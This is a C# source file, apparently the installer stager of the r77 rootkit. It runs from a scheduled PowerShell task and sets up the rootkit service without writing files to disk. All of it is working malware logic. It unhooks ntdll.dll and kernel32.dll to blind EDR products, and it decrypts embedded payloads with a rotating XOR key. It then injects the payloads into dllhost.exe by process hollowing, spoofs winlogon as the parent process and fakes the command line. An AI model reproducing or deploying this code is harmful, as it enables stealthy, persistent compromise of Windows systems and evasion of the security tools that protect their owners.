using InstallStager.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;

/// <summary>
/// Fileless stager for the r77 service.
/// <para>This executable is spawned by a scheduled task (powershell) and creates a process using process hollowing.</para>
/// </summary>
public static class Program
{
	// The target framework is .NET 3.5.
	// Normally, if .NET 4.x is installed, but .NET 3.5 isn't, this executable doesn't start.
	// However, the target framework is not relevant in the powershell context.
	// The executable will run, if *either* .NET 3.5 *or* .NET 4.x is installed.
	// To immediately spot code that is incompatible with .NET 3.5, the target framework is set to .NET 3.5.
	public static void Main()
	{
		// Unhook DLL's that are monitored by EDR.
		// Otherwise, the call sequence analysis of process hollowing gets detected and the stager is terminated.
		Unhook.UnhookDll("ntdll.dll");
		if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
		{
			// Unhooking kernel32.dll on Windows 7 x86 fails.
			//TODO: Find out why unhooking kernel32.dll on Windows 7 x86 fails.
			Unhook.UnhookDll("kernel32.dll");
		}

		Process.EnterDebugMode();

		// Get r77 service executable.
		byte[] payload32 = Decompress(Decrypt(Resources.InstallService32));
		byte[] payload64 = Decompress(Decrypt(Resources.InstallService64));

		// Executable to be used for process hollowing.
		string path = @"C:\Windows\System32\dllhost.exe";
		string pathWow64 = @"C:\Windows\SysWOW64\dllhost.exe";
		string commandLine = "/Processid:" + Guid.NewGuid().ToString("B"); // Random commandline to mimic an actual dllhost.exe commandline (has no effect).

		// Parent process spoofing can only be used on certain processes, particularly the PROCESS_CREATE_PROCESS privilege is required.
		int parentProcessId = Process.GetProcessesByName("winlogon")[0].Id;

		// Create the 32-bit and 64-bit instance of the r77 service.
		if (Helper.Is64BitOperatingSystem())
		{
			if (IntPtr.Size == 4)
			{
				RunPE.Run(pathWow64, commandLine, payload32, parentProcessId);
			}
			else
			{
				RunPE.Run(path, commandLine, payload64, parentProcessId);
			}
		}
		else
		{
			RunPE.Run(path, commandLine, payload32, parentProcessId);
		}
	}

	private static byte[] Decompress(byte[] data)
	{
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (GZipStream gzipStream = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
			{
				Helper.CopyStream(gzipStream, memoryStream);
			}

			return memoryStream.ToArray();
		}
	}
	private static byte[] Decrypt(byte[] data)
	{
		// Only a trivial encryption algorithm is used.
		// This improves the stability of the fileless startup, because less .NET classes are imported that may not be present on the target computer.

		int key = BitConverter.ToInt32(data, 0);
		byte[] decrypted = new byte[data.Length - 4];

		for (int i = 0; i < decrypted.Length; i++)
		{
			decrypted[i] = (byte)(data[i + 4] ^ (byte)key);
			key = key << 1 | key >> (32 - 1);
		}

		return decrypted;
	}
}